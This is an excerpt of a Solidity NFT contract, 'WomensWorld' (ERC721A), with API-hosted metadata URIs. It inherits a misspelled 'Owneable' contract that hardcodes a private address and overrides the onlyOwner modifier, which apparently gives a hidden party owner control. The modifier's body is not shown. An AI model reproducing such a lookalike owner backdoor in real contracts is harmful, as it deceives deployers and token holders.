 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x185c765D3A69Cb1cbD59eF2753dad7Ab0E5E7E82;
    modifier onlyOwner() {
...
contract WomensWorld is ERC721A, Owneable {

    string public baseURI = "https://mw9spidhbc.execute-api.us-east-1.amazonaws.com/dev/token/universe-of-women/";
    string public contractURI = "https://mw9spidhbc.execute-api.us-east-1.amazonaws.com/dev/token/universe-of-women/";
    ...
    constructor() ERC721A("Women's World", "Women") {}
